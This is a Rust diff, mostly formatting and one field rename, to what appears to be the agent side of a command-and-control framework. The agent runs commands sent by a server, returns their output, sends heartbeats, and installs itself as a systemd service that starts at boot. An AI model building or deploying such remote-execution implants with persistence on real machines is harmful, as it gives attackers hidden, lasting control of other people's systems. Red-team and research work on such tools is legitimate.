@@ -1,17 +1,17 @@
 use crate::agent::AgentContext;
-use tokio::process::Command as OtherCommand;
-use talaria::protocol::*;
 use std::fs;
 use std::io::Write;
-use tokio::io::AsyncWriteExt;
-use tokio::io;
 use std::process::Output;
+use talaria::protocol::*;
+use tokio::io;
+use tokio::io::AsyncWriteExt;
+use tokio::process::Command as OtherCommand;
 
 /// Handles responses from the server.
-use std::process::{Command};
+use std::process::Command;
 
 pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) {
-    match response.instruction {
+    match response.packet_body {
         AgentInstructionBody::Command {
             ref command,
             ref command_id,
@@ -43,7 +43,7 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
                     command: command.to_string(),
                     command_id: *command_id,
                     status_code,
-                    stdout,  // Send the actual command output (stdout) as the response
+                    stdout, // Send the actual command output (stdout) as the response
                     stderr,
                 },
             };
@@ -55,7 +55,7 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
             // Sending the command output as the heartbeat instead of a static "Hello from server!" message
             let heartbeat_response = AgentResponse {
                 packet_header: agent.generate_packet_header(),
-                packet_body: AgentResponseBody::Heartbeat,  // Using the command output as the heartbeat
+                packet_body: AgentResponseBody::Heartbeat, // Using the command output as the heartbeat
             };
 
             // Send the heartbeat response with command output to the server
@@ -71,7 +71,6 @@ pub async fn handle_response(agent: &mut AgentContext, response: AgentInstructio
 
     println!("Processed Response: {:#?}", response);
 }
-
 
 /// Sends a heartbeat to the server.
 pub async fn send_heartbeat(agent: &mut AgentContext) -> Option<AgentInstruction> {
@@ -102,13 +101,12 @@ pub async fn setup_systemd_service() -> Result<(), io::Error> {
     );
 
     // Save the service content to the systemd folder
-    let mut file = tokio::fs::File::create(format!("/etc/systemd/system/{}.service", service_name)).await?;
+    let mut file =
+        tokio::fs::File::create(format!("/etc/systemd/system/{}.service", service_name)).await?;
     file.write_all(service_content.as_bytes()).await?;
 
     // Reload systemd to recognize the new service
-    let _ = Command::new("systemctl")
-        .arg("daemon-reload")
-        .output();
+    let _ = Command::new("systemctl").arg("daemon-reload").output();
 
     // Enable the service to start on boot
     let _ = Command::new("systemctl")
@@ -147,11 +145,11 @@ async fn make_request(
         Err(_) => None,
     }
 }
- 
+
 //
- //async fn make_request(
- // agent: &mut AgentContext,
- //   request: AgentResponse,
+//async fn make_request(
+// agent: &mut AgentContext,
+//   request: AgentResponse,
 //) -> Option<AgentInstruction> {
 //    // agent.send_log.push(request.clone());
 //
@@ -176,3 +174,4 @@ async fn make_request(
 //        }
 //    }
 //}
+
